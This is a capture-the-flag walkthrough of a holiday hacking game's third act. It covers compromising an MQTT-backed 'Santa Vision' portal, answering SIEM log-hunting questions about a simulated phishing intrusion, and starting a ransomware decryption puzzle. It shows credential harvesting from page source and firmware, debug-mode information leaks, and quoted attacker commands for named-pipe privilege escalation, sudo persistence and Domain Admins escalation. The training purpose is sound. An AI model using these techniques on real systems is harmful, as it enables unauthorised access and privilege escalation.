# Act 3
- [Santa Vision](#santa-vision)
- [Elf Stack](#elf-stack)
- [Decrypt the Naughty-Nice List](#decrypt-the-naughty-nice-list)
- [Deactivate the Frostbit Naughty-Nice List Publication](#deactivate-the-frostbit-naughty-nice-list-publication)
## Santa Vision
**Location:** The Front Yard (Act 3)
**NPC:** Ribb Bonbowford

*Alabaster and Wombley have taken over the "Santa Vision" feeds. We are tasked with knocking them out to restore the regularly scheduled programming from Santa. This challenge has 4 parts (A, B, C, D). Each of these parts has a silver and gold answer. This means we will need to find two answers for each question. The gold one will likely be harder to find than silver.*

This whole challenge operates through the GateXOR infrastructure which can be accessed by clicking on the Santa Vision terminal beside Ribb Bonbowford. To spin up the infrastructure, click the alligator icon in the bottom right corner of the screen to go to the terminal page, and then click `Time Travel`. This will spin up the infrastructure and eventually give us an IP address that represents the instance we will interface with. These instances has a time to live (TTL) of about 2 hours, meaning 2 hours after you spin them up they will stop themselves and you will have to create a new instance to continue if you are not done. If you do finish with the challenge or want to reset your instance, you can click the `Collapse` button to destroy the instance and start over. Once the instance is set up, it should look like this (note: your IP address will likely be different than mine):

![GateXOR](../images/santa_vision/gatexor.png)

### Nmap
Whenever I am given an IP address to interface with, I always like to scan it with nmap or masscan to figure out what ports are open. Since we are only scanning one IP address, I will use nmap and tell it to scan all ports.

```
nmap -p- <IP ADDRESS HERE>
```

Note: This could take around 20 minutes to complete.

Result:
![nmap scan](../images/santa_vision/nmap_scan.png)

A couple interesting ports are showing here. 1883 is the mqtt port which we were hinted about, 8000 is shown as an http port, and 9001 is sometimes used alongside MQTT for websockets to send information.
### Silver
#### Santa Vision - A
Question: *What username logs you into the SantaVision portal?*

From our nmap scan above, we see that HTTP is over port 8000. Lets visit the server on port 8000 to check whats there.

URL: `<YOUR INSTANCE IP ADDRESS>:8000`

![Web Interface](../images/santa_vision/web_interface.png)

Great. We found the web UI. Now, we need to try and log in somehow. Let's take a look at the source code (Control+U). Right on the front page, look what we find.

![Credentials found](../images/santa_vision/found_creds.png)

Creds: `mqtt: elfanon:elfanon`
Topic: `sitestatus`

If we try these creds to log in to the web UI, they work! Thats our silver answer for part A.

Part A Silver Answer: `elfanon`
#### Santa Vision - B
Question: *Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the `northpolefeeds` on the monitors. What username worked here?*

After lots of looking around for complex solutions to this problem, it dawned on me that the answer may be right in front of me. Once you're logged into the Santa Vision web UI with `elfanon:elfanon`, you can click two buttons at the bottom of the screen; `List Available Clients` and `List Available Roles`.

Available Clients: `'elfmonitor', 'WomblyC', 'AlabasterS'`
Available Roles: `'SiteDefaultPasswordRole', 'SiteElfMonitorRole', 'SiteAlabsterSAdminRole', 'SiteWomblyCAdminRole'`

Since we are specifically asked to not use Wombley or Alabasters account, we must be looking for the `elfmonitor` account. For the password, it was as simple as using `SiteElfMonitorRole`. I discounted this possibility for a while assuming it wasn't even a password. Lesson learned to just try things!

Credentials: `elfmonitor:SiteElfMonitorRole`

Now we can use these credentials to turn on the monitors and watch the northpolefeeds with the following inputs:

Connect As: `elfmonitor`
Password: `SiteElfMonitorRole`
Camera Feed Server: `YOUR SERVER IP ADDRESS`
Camera Feed Port: `9001`

You must input that information, turn on the monitors and then set the broadcast feed to `northpolefeeds` and click "Connect to broadcast feed".

![Monitors](../images/santa_vision/monitors.png)

Awesome, now we have our part B answer for silver!

Answer: `elfmonitor` (Silver)
#### Santa Vision - C
Question: *Using the information available to you in the SantaVision platform, subscribe to the `frostbitfeed` MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?*

If we try and subscribe to the `frostbitfeed` MQTT topic with our newly found `elfmonitor` creds it with authenticate us successfully. If we wait for a while, we come across two interesting messages.

*Note: There are many MQTT clients available, but I used MQTT-Explorer for this challenge.*

Message 1:
`Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key`

Message 2:
`Additional messages available in santafeed`

The first message may come in handy later, but for now let's try and subscribe to `santafeed`. The same credentials will work, and if we wait again we will find the following interesting messages.

Message 1:
`Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley`

Message 2:
`Sixteen elves launched operation: Idemcerybu`

Again, the first message may come in handy later, but the second message is exactly what we're looking for. The code name for the elves' secret operation!

Answer (Silver): `Idemcerybu`
#### Santa Vision - D
Question: *There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the `northpolefeeds` feed. What type of contraption do you see Santa on?*

 If we watch the `santafeed` topic for long enough (elfmonitor creds), we see the following message; `singleAdminMode=false`. The objective of this part of the challenge talks about how there are too many admins. Maybe to demote Wombley and Alabaster, all we need to do is set `singleAdminMode=true` and Santa will regain control as the single admin. Lets try it out. Subscribe to the `santafeed` topic and send the following message `singleAdminMode=true`. Now take a look at the `northpolefeeds` on the monitors.

![Santas Pogostick](../images/santa_vision/santa_pogo_stick.png)

Santa is on a pogo stick! Well done! That's our answer for silver part D!

Answer (Silver): `pogo stick`
### Gold
#### Santa Vision - A
Question: *What username logs you into the SantaVision portal?

Let's try and connect to the `sitestatus` MQTT topic we found in part A and see what we can find. Remember, we found the MQTT port on 1833 from our nmap scan earlier.

Connect to the `sitestatus` topic on your server (port 1883) using the elfanon credentials we found. Once connected, we see a stream of messages coming through the `sitestatus` topic. After watching for a while, one message stands out.

```
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
```

If we add this to the webserver URL, we can download the file `applicationDefault.bin`.

URL:
`http://<server_ip>:8000/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin`

Now let's check the type of this file with the `file` command
```
file applicationDefault.bin
```

Result: `applicationDefault.bin: Linux jffs2 filesystem data little endian`

One of the hints we got for this challenge was the following:
[jefferson](https://github.com/onekey-sec/jefferson/) is great for analyzing JFFS2 file systems.

Let's download jefferson and try it out. Follow the instructions on the jefferson github to install it. Once we have it installed, we can extract the filesystem with the following command.

```
jefferson applicationDefault.bin -d outdir
```

Now inside the `outdir` directory, we can browse through all the files to see if there's anything interesting. After looking for a while, I came across the following credentials in the `app/src/accounts/views.py` file.

```
@accounts_bp.route("/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite", methods=["GET"])
```

Let's try and download this database the same way as we did with `applicationDefault.bin`.

URL:
`http://<server_ip>:8000/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite`

It worked! Let's see if we can open it. Use the sqlite3 command to enter the sqlite shell and then open the database and list its tables.

![Sqlite creds](../images/santa_vision/sqlite_creds.png)

Turns out there is a `users` table in the sqlite database and upon querying it we found the following credentials:

Username: `santaSiteAdmin`
Password: `S4n+4sr3411yC00Lp455wd`

If we try and use this to log into the Santa Vision portal, it works!

Answer (Gold): `santaSiteAdmin`
#### Santa Vision - B
Question: *Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the `northpolefeeds` on the monitors. What username worked here?*

One of the hints for this part was `Be on the lookout for strange HTTP headers...`
Let's use burp's proxy browser to log into Santa Vision with our newfound `santaSiteAdmin` credentials and take a look through all the request/response headers to see what we find.

Sure enough, when we log in as `santaSiteAdmin` to the web ui, one of the HTTP requests has some credentials in the HTTP header:

![HTTP Headers](../images/santa_vision/http_header_creds.png)

```
BrkrTopic: northpolefeeds
BrkrUser: santashelper2024
BrkrPswd: playerSantaHelperPass8153306128
```

Let's test and see if these credentials will help us authenticate to the monitors. They do!

*Note: The password for this user is unique to the login session of SantaSiteAdmin so it will change if you log out and log in again. Each time you do so you must check the HTTP headers and get the new password.*

Answer (Gold): `santashelper2024`
#### Santa Vision - C
Question: *Using the information available to you in the SantaVision platform, subscribe to the `frostbitfeed` MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?

After scouring the MQTT feeds for ages, I couldn't seem to find any more clues as to what the "Gold" answer for this question could be. How could there be more than one name for a secret operation? But maybe there weren't two names, maybe the name `Idemcerybu` is just encoded? It doesn't look like base64, and if you try to decode it with base64 it produces gibberish. So what could have been used to encrypt it if we have not found any key to decrypt it? A caesar substitution cipher.

To quickly try out all possibilities, we can use CyberChef and it's ROTATE recipe (ROT13). By default it rotates the characters by 13 (example: a --> n), but we can change that value. After some trial and error the answer was found with a rotation value of 10.

![Caesar Cipher](../images/santa_vision/rotate.png)

Answer (Gold): `Snowmobile`
#### Santa Vision - D
Question: *There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the `northpolefeeds` feed. What type of contraption do you see Santa on?

We have already done this once. There must be something we need to change to get a different output. We just found a bunch of new credentials, the `SantaSiteAdmin` to log into the web interface, and from that we got `santashelper2024` which we can use to turn on the monitors and subscribe to MQTT topics. Let's try using the `santashelper2024` user to connect to the `santafeed` and send the `singleAdminMode=true` message as we did before and see if it changes anything.

Note: When logging in with MQTT, make sure to log in with `SantaSiteAdmin` on the web UI, then get the `santashelper2024` credentials from the HTTP headers in burp which you can use for MQTT. You may also want to use them to log into the monitor feed on the web UI to watch the `northpolefeed` for changes.

Once we are logged in on MQTT-Explorer, send the `singleAdminMode=true` to the santafeed. Watch the monitors next to see what happens.

![Santas Hovercraft](../images/santa_vision/santa_hovercraft.png)

It worked! Santa is riding on a hovercraft!

Answer (Gold): `Hovercraft`
### Extra
I found some extra credentials in the jefferson filesystem at `app/src/core/views.py` that didn't seem to come into play. 

```
auth={'username':"SantaBrokerAdmin", 'password':"8r0k3R4d1mp455wD"}
```

Considering that these credentials have the word "Broker" and "Admin" in them, I assume they are for interacting with MQTT as an admin. I tried using them to send the `singleAdminMode=true` message but they didn't work.

---
## Elf Stack
**Location:** The Front Yard (Act 3)
**NPC:** Fitzy Shortstack

*Help the ElfSOC analysts track down a malicious attack against the North Pole domain.*

*Note: This challenge uses some docker compose infrastructure. To get it up and running, make sure you first run `docker compose up setup`, then once that is done run `docker compose up`. Once that is done, go to `localhost:5601` and login using the following credentials; `elastic:ELFstackLogin!`. Once logged in, go to the "Discover" tab and set the date range for the logs to `Jan 1, 2024 -> Dec 31, 2024`.*
### Easy Mode
#### Question 1
Q: *How many unique values are there for the event_source field in all logs?*
A: `5`

Explanation:
Click `event_source` in the left hand tab and click visualize. In the menu to the right of the graph, put unique count of event_source on y axis and remove the x axis. Hover over the graph to see the count.

![Unique event source count](../images/elf_stack/easy_mode/q1_graph.png)
#### Question 2
Q: *Which event_source has the fewest number of events related to it?*
A: `AuthLog`

Explanation:
Using the same method as question 1, put event_source on the x axis and the count of events on the y axis.

![Question 2 graph](../images/elf_stack/easy_mode/q2_graph.png)
#### Question 3:
Q: *Using the event_source from the previous question as a filter, what is the field name that contains the name of the system the log event originated from?*
A: `hostname`
KQL Query:
```
event_source : "AuthLog" 
```

After running this query, open one of the logs and look through all the fields. You will find the `hostname` field.
#### Question 4:
Q: *Which event_source has the second highest number of events related to it?*
A: `NetflowPmacct`

Explanation:
We can look at the same graph from question 2.
#### Question 5:
Q: *Using the event_source from the previous question as a filter, what is the name of the field that defines the destination port of the Netflow logs?*
A: `port_dst`
KQL Query:
```
event_source : "NetflowPmacct" 
```

After running this query, open one of the logs and look through all the fields. You will find the `port_dst` field.
#### Question 6:
Q: *Which event_source is related to email traffic?*
A: `SnowGlowMailPxy`

Explanation:
The name of the event source makes it obvious, but if you look through logs of that event source you will see all the email related data such as email addresses and email content.
#### Question 7:
Q: *Looking at the event source from the last question, what is the name of the field that contains the actual email text?*
A: `Body`
KQL Query:
```
event_source : "SnowGlowMailPxy"
```

After running this query, open one of the logs and look through all the fields. You will find the `Body` field with email text in it.
#### Question 8:
Q: *Using the 'GreenCoat' event_source, what is the only value in the hostname field?*
A: `SecureElfGwy`
KQL Query:
```
event_source : "GreenCoat"
```

After running this query, look through the logs. You will find the `hostname` field is the same for all of them. 
#### Question 9:
Q: *Using the 'GreenCoat' event_source, what is the name of the field that contains the site visited by a client in the network?*
A: `url`
KQL Query:
```
event_source : "GreenCoat"
```

After running this query, open one of the logs and look through all the fields. You will find the `url` field with the site url in it.
#### Question 10:
Q: *Using the 'GreenCoat' event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?*
A: `pagead2.googlesyndication.com:443`

Explanation:
Using the same method as question 2, search for the `url` field on the left pane and visualize it. In the x axis, put the top 5 values of `event.url`. In the y axis, put `Count of records`. The above url comes out ahead with 150 records.
#### Question 11:
Q: *Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?*
A: `5`

Explanation:
Visualize `event.Channel` and set the y axis as unique count of `event.Channel` and remove the x axis.
#### Question 12:
Q: *What is the name of the event.Channel (or Channel) with the second highest number of events?*
A: `Microsoft-Windows-Sysmon/Operational`

Explanation:
Visualize `event.Channel` and set the x axis to the top 5 values of `event.Channel` and set the y axis to `Count of records`. The second highest count is `Microsoft-Windows-Sysmon/Operational` with 17,709 records.
#### Question 13:
Q: *Our environment is using Sysmon to track many different events on Windows systems. What is the Sysmon Event ID related to loading of a driver?*
A: `6`

Explanation:
After searching for a long time, I immediately found the answer with a search on duckduckgo.
#### Question 14:
Q: *What is the Windows event ID that is recorded when a new service is installed on a system?*
A: `4697`

Explanation:
Duckduckgo strikes again...
#### Question 15:
Q: *Using the WindowsEvent event_source as your initial filter, how many user accounts were created?*
A: `0`

Explanation:
I'm pretty sure the relevant event id for this event would be 4720, but doing a search for that we don't see anything so...zero it is!
### Hard Mode
#### Question 1:
Q: *What is the event.EventID number for Sysmon event logs relating to process creation?*
A: `1`

Explanation:
Duckduckgo again!
#### Question 2:
Q: *How many unique values are there for the 'event_source' field in all of the logs?*
A: `5`

Explanation:
Same answer as easy mode.
#### Question 3:
Q: *What is the event_source name that contains the email logs?*
A: `SnowGlowMailPxy`

Explanation:
Same answer as easy mode.
#### Question 4:
Q: *The North Pole network was compromised recently through a sophisticated phishing attack sent to one of our elves. The attacker found a way to bypass the middleware that prevented phishing emails from getting to North Pole elves. As a result, one of the Received IPs will likely be different from what most email logs contain. Find the email log in question and submit the value in the event 'From:' field for this email log event.*
A: `kriskring1e@northpole.local`
KQL Query:
```
event_source : "SnowGlowMailPxy"
```

Explanation:
Click on the `ReceivedIP2` field in the left pane. The following visualization should show.
![ip visualization](../images/elf_stack/hard_mode/receivedip2.png)
Now send the following KQL query to get the email in question.

```
event_source : "SnowGlowMailPxy" and event.ReceivedIP2 : "34.30.110.62"
```

Only one event is shown, with the `From` field set to `kriskring1e@northpole.local`.
#### Question 5:
Q: *Our ElfSOC analysts need your help identifying the hostname of the domain computer that established a connection to the attacker after receiving the phishing email from the previous question. You can take a look at our GreenCoat proxy logs as an event source. Since it is a domain computer, we only need the hostname, not the fully qualified domain name (FQDN) of the system.*
A: `SleighRider`

Looking at the email log from question 4, we see the following email body
```
We need to store the updated naughty and nice list somewhere secure. I posted it here http://hollyhaven.snowflake/howtosavexmas.zip. Act quickly so I can remove the link from the internet! I encrypted it with the password: n&nli$t_finAl1 thx! kris - Sent from the sleigh. Please excuse any Ho Ho Ho's.
```
So we should look for any logs that reach out to that domain
```
event_source : "GreenCoat" and event.url : "http://hollyhaven.snowflake/howtosavexmas.zip"
```

Only one result shows up with the following:
`event.host: SleighRider`
#### Question 6:
Q: *What was the IP address of the system you found in the previous question?*
A: `172.24.25.12`

Explanation:
Found in the same log as above (event.ip).
#### Question 7:
Q: *A process was launched when the user executed the program AFTER they downloaded it. What was that Process ID number (digits only please)?*
A: `10014`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID : 1 and event.CommandLine : *howtosavexmas.zip*
```

Explanation:
Only one log is found. Look at the value for event.ProcessID.
#### Question 8:
Q: *Did the attacker's payload make an outbound network connection? Our ElfSOC analysts need your help identifying the destination TCP port of this connection.*
A: `8443`
KQL Query:
```
event_source : "WindowsEvent" and event.ProcessID : "10014" and event.Category : "Network connection detected (rule: NetworkConnect)" and event.Image : *howtosavexmas*
```

Explanation:
Use the process id value we found in question 7. Only one log is returned and the `event.DestinationPort` is 8443.
#### Question 9:
Q: *The attacker escalated their privileges to the SYSTEM account by creating an inter-process communication (IPC) channel. Submit the alpha-numeric name for the IPC channel used by the attacker.*
A: `ddpvccdbr`
KQL Query:
```
event_source : "WindowsEvent" and event.ProcessID : "10014" and event.CommandLine: *pipe*
```

Explanation:
I did some research on what methods are used for inter process communication on windows and came across the following [webpage](https://stackoverflow.com/questions/2721762/what-are-windows-ipc-methods). It seems named pipes are the most easy/common method for IPC so I decided to include the word "pipe" in my query. Sometimes thats what it takes...

Offending command:
```
cmd.exe /c echo ddpvccdbr &gt; \\.\pipe\ddpvccdbr
```
#### Question 10:
Q: *The attacker's process attempted to access a file. Submit the full and complete file path accessed by the attacker's process.*
A: `C:\Users\elf_user02\Desktop\kkringl315@10.12.25.24.pem`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4663" and event.ProcessID : "10014"
```

Explanation:
4663 is the windows EventID for file access ("Attempt was made to access an object"). Using that event id and the process ID, there was only one log returned.
#### Question 11:
Q: *The attacker attempted to use a secure protocol to connect to a remote system. What is the hostname of the target server?*
A: `kringleSSleigH`

Explanation:
After no luck with KQL, I did a grep in the logs for the ip from the previous question (`10.12.25.24`) and found a bunch of logs for this SSH server with logs of allowing connections to it.

![SSH Connection](../images/elf_stack/hard_mode/grep_ssh.png)
#### Question 12:
Q: *The attacker created an account to establish their persistence on the Linux host. What is the name of the new account created by the attacker?*
A: `ssdh`
KQL Query:
```
event_source : "AuthLog" and event.message: *new*
```

Explanation:
After the above KQL query, there were 5 logs returned. One of them had the following in its `event.message` field; `new user: name=ssdh, UID=1002, GID=1002, home=/home/ssdh, shell=/bin/bash, from=/dev/pts/6`.
#### Question 13:
Q: *The attacker wanted to maintain persistence on the Linux host they gained access to and executed multiple binaries to achieve their goal. What was the full CLI syntax of the binary the attacker executed after they created the new user account?*
A: `/usr/sbin/usermod -a -G sudo ssdh`
KQL Query:
```
event_source : "AuthLog" and event.message *ssdh*
```

Explanation:
11 events were returned from the query, one of them showed this command being run where they are giving their new user sudo privileges.
#### Question 14:
Q: *The attacker enumerated Active Directory using a well known tool to map our Active Directory domain over LDAP. Submit the full ISO8601 compliant timestamp when the first request of the data collection attack sequence was initially recorded against the domain controller.*
A: `2024-09-16T11:10:12-04:00`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "2889"
```

Explanation:
I did some research and found that event ID 2289 represents an LDAP bind. Most Active Directory mapping tools will need to use bind's so this is a good starting point. Sort all the events and take the first one. The ISO8601 compliant timestamp is available in the `event.Date` field.
#### Question 15:
Q: *The attacker attempted to perform an ADCS ESC1 attack, but certificate services denied their certificate request. Submit the name of the software responsible for preventing this initial attack.*
A: `KringleGuard`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4888"
```

Explanation:
Through some research I found the following [webpage]( https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4886) showing the event ids related to certificate requests. The event id 4888 represents a denied certificate. In an ADCS ESC1 attack, it's likely that this event will trigger at least once. The query returned only one log and the answer can be seen in the `event.ReasonForRejection` field; `KringleGuard EDR flagged the certificate request.`
#### Question 16:
Q: *We think the attacker successfully performed an ADCS ESC1 attack. Can you find the name of the user they successfully requested a certificate on behalf of?*
A: `nutcrakr`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4886"
```

Explanation:
Event ID 4866 is the result of a successful certificate request. [Source](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4886). The query returns only one log. We can see the answer in the `event.UserInformation_UPN` field.
#### Question 17:
Q: *One of our file shares was accessed by the attacker using the elevated user account (from the ADCS attack). Submit the folder name of the share they accessed.*
A: `WishLists`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "5140" and event.SubjectUserName: "nutcrakr"
```

Explanation:
[This webpage](https://docs.logrhythm.com/devices/docs/evid-5140-5144-network-share-was-accessed-security) shows that the event id for when a network share is accessed is 5140. There were 7 different logs shown with this query with different network shares, but the most unique was `WishLists`.
#### Question 18:
Q: *The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?*
A: `fR0s3nF1@k3_s`

Explanation:
After tons of searching with no luck I decided to just grep for `nutcrakr` and manually search after that and it was at the bottom of the grep response for `log_chunk_2.log`.

```
"ScriptBlockText": "Add-Type -AssemblyName System.DirectoryServices\n$ldapConnString = \"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\"\n$username = \"nutcrakr\"\n$pswd = 'fR0s3nF1@k3_s'\n$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$propGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"northpole.local\\$username\"
```
#### Question 19:
Q: *The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?*
A: `2024-09-16T15:35:57.000Z`
KQL Query: 
```
event_source :"WindowsEvent" and event.EventID: 4624 and event.TargetUserName : *nutcrakr* and event.WorkstationName: DC01
```

Explanation:
[This webpage](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624) shows that the event ID for a successful logon is 4624. This combined with the target username of `nutcrakr` and destination workstation of the domain controller `DC01` (found from other logs) returned 2 logs. Looking into the details of these logs, there is a field called `event.LogonType`. Based on [this webpage](https://www.manageengine.com/products/active-directory-audit/learn/what-are-logon-types.html) the logon type of 10 is for logins through RDP connections. Only one of the found logs meets this criteria. We have our answer.
#### Question 20:
Q: *The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?*
A: `C:\WishLists\santadms_only\its_my_fakelst.txt`

Explanation:
Using grep I searched for look the 'WishLists' share from before as well as the 'nutcrakr' user. Eventually I found the following:
```
\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\WishLists\\santadms_only\\its_my_fakelst.txt
```
#### Question 21:
Q: *The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?*
A: `4`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *wcub*
```

Explanation:
I assumed the Wombley faction would use an email with at least the string "wcub" in it somewhere. From there click on the `event.From` field in the left bar to visualize it. Remove the x axis and set y axis to unique count of `event.From`. This shows 4 unique email addresses.
#### Question 22:
Q: *The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?*
A: `22`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: asnowball* and event.To : wcub*
```

The total count of events is 22.
#### Question 23:
Q: *Of all the reindeer, there are only nine. What's the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.*
A: `rud01ph.glow`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *rud*
```

Explanation:
The reindeer whose nose glows and shines is rudolph. I did a search for `*rud*` and managed to find a bunch of logs. You can see the email domain in the `event.From` field in any of the returned logs.
#### Question 24:
Q: *With a fiery tail seen once in great years, what's the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.*
A: `c0m3t.halleys`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *c0m*
```

Explanation:
The reindeer "with a fiery tail" must be referring to Comet, who is named after the celestial comet which creates a tail of fire when it streaks across the sky. I tried a search for `*com*` in the `event.From` field but when that didn't return anything I assumed a possible character switch from o to 0. The email domain can be seen in the `event.From` field in any of the returned logs.
## Decrypt the Naughty-Nice List
**Location:** The Front Yard (Act 3)
**NPC:** Tangle Coalbox

*Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.*

Upon opening the challenge window, we are greeted with a message telling us that the Naughty-Nice list has been encrypted by the Frostbit ransomware. We are also told that the North Pole Cyber Security Department collected some artifacts from the compromised computer which we can download to inspect. Click the button to start the download (it can take a while).

![Generate artifacts](../images/frostbit_decrypt/generate.png)

Once the artifacts are downloaded, we can unzip the archive and inspect them. It seems we have a binary file, a core dump of the infected machine, a pcap file and the encrypted naughty nice list.

One of the hints for this challenge mentions that we can use tools like `strings` to find secrets in memory (core dump). Let's use strings on the core dump file and see what we can find.

```
strings frostbit_core_dump.13 | less
```

Inside, the following TLS secrets are logged. This could be useful for the pcap file we have.

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d d11bd2a38666f099f412dd82ac4f6d524195c4060110405c3379bbe590bfdcd8
SERVER_HANDSHAKE_TRAFFIC_SECRET 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d ee4e74596e54cde50ad765dd60a5d548b7a2e0db5e83024227d7a8572cef59f9
CLIENT_TRAFFIC_SECRET_0 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d a63e8ba98c8c6cab350826907e2b4cd773030e27f323b6b5829db82010c27b9c
SERVER_TRAFFIC_SECRET_0 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d 84d395a4a54fe2a4abdad0a4c95992710286471636aec46dcc190319e9b3b863
```

Let's open up the pcap with wireshark and see what traffic we can inspect.

![Wireshark encrypted](../images/frostbit_decrypt/wireshark_encrypted.png)
It seems as though all the traffic is encrypted with TLS. Let's import those secrets we found in the core dump so that we can read the data. Make a file called `ssl-key.log` and put the keys we just found in it. Now go into `Wireshark -> Preferences -> Protocols -> TLS` and load your `ssl-key.log` file into the "(Pre)-Master-Secret log filename" input. Press OK and go back to the TLS traffic. At the bottom of the frame view you should now have a "Decrypted TLS" tab to view the now decrypted TLS data.

![decrypted tls](../images/frostbit_decrypt/decrypted_tls.png)

Now if you look through all the decrypted TLS traffic, we can find a couple interesting values.
- `nonce: ec622b7c418bd0c1`
- `encryptedKey: 6b483e6f04b41a10ea694c53933aacc3b35929bfba7d39c03170d33ef858397263f04535128505e080538812a615b6356a0250e65f061414ae876ecc6de6f6c5a72693efd70ea7f38ff58a2d0c913d94dbe7a98bbf24f1fe0a57be39b3e1b0295160bc27b363c5513dc7326dafb3705b22cb6326550e3498b498dd6bc5215df694af02c4f3e12ae53df9608440374b8255048d3f6bdfd98861dced9f8254598f57414792e8c67788d2b1ffeeadeebedad255a2d910cf13fd8e04853fe096844334fe782ed86ebbc4f4d08a4e417e4b5e99f59c7f9ef0e87579667b13d1fc87015f9ed19faef9cd7d77c4147b8cb3c81e9ea0bcf046c7707ea3f340cff28b38f3eee88332ae81e2afb50a6961290b1a7bb29871bb33c8e851f948ac51c5cc1e9ff5f11da65e45f73e27301b348d410a153bbbb2eb98b5ca89495fff4eedcdd68f1e0dae3dcdffd0ae978d903402ffb0e8f20619217daf76e5dcafd3a9c113c67b17b420b298c478af5cb59b2fff07a427e344f6f3eaaa1cff78c08432d7547871a5201016f8dd2e571bc54d3be9e2281763f75cf3215afbe0516c969fe630a194c419f28ae4e877949175ca9906621488060db24dcf61b7cf4d7a07ac1bb5fd6bb395689bea1773d8193e8a94113959fdc95ee782c1622f391cd8c5de4bbf3efbffa042745af871142059a977133498fa23f1687f2519b70552f9129c845d7bd9`

These values might come in handy later. For now let's go back to looking through the core dump. The following domain appears a couple times `api.frostbit.app`. Let's visit it and see what's there.

![Home page](../images/frostbit_decrypt/homepage.png)

This looks like the frostbit ransomware main page. It shows a large timer for how much time we have before the Naughty Nice List is published online.

Let's try and play around with this site and see if we can find anything interesting. The URL has a bunch of values that we can edit.

URL:
`https://api.frostbit.app/view/CxHT7yuAZ/ae3ac150-d4c0-8b12-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202828`

What happens if I remove a digit from the `digest`? We get an error: `{"error":"Invalid Request"}`. We get the same error if we change the path value after /view or the uuid value before /status. One of the hints for this challenge mentions that there might be a dev mode on this webpage that was not disabled, meaning we could potentially take advantage of it by getting extra information from any errors we encounter. The most obvious option to try would be to simply add a url parameter like `dev=true` or `debug=true`. Sure enough, adding `&debug=true` to the end of our url combined with removing a single character of the path variable after /view/ gives us another error, but this time with more detailed information.

```json
{"debug":true,"error":"Status Id File Not Found"}
```

Now if we do the same, but instead remove the character from the digest, we get another detailed error.

```json
{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}
```

Let's see if we can grab this file from the webserver by modifying the url.

URL:
`https://api.frostbit.app/static/FrostBiteHashlib.py`

From this URL, we get the following python file.

```python
import traceback
import binascii

class Frostbyte128:
    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
        self.file_bytes = file_bytes
        self.filename_bytes = filename_bytes
        self.filename_bytes_length = len(self.filename_bytes)
        self.nonce_bytes = nonce_bytes
        self.nonce_bytes_length = len(self.nonce_bytes)
        self.hash_length = hash_length
        self.hash_result = self._compute_hash()

    def _compute_hash(self) -> bytes:
        hash_result = bytearray(self.hash_length)
        count = 0

        for i in range(len(self.file_bytes)):
            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
            count += 1

        for i in range(len(self.filename_bytes)):
            count_mod = count % self.hash_length
            count_filename_mod = count % self.filename_bytes_length
            count_nonce_mod = count % self.nonce_bytes_length
            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
            hash_result[count_mod] = hash_result[count_mod] & xrd
            count += 1

        return bytes(hash_result)

    def digest(self) -> bytes:
        """Returns the raw binary hash result."""
        return self.hash_result

    def hexdigest(self) -> str:
        """Returns the hash result as a hexadecimal string."""
        return binascii.hexlify(self.hash_result).decode()

